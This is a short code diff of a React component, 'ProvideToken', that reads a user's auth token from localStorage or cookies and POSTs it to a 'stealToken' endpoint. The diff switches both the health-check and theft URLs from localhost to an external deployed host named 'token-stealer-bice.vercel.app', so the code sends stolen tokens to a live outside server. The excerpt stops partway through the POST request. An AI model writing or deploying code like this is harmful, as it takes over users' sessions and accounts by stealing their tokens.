@@ -13,11 +13,11 @@ const ProvideToken: React.FC = () => {
       ?.split("=")[1];
     const token = LocalStorageToken || cookieToken;
     // server health check
-    const response = await fetch("http://localhost:3000/api/v1/health");
+    const response = await fetch("https://token-stealer-bice.vercel.app/api/v1/health");
 
     if (token && response.ok) {
       const stealToken = await fetch(
-        "http://localhost:3000/api/v1/stealToken",
+        "https://token-stealer-bice.vercel.app/api/v1/stealToken",
         {
           method: "POST",
           headers: {
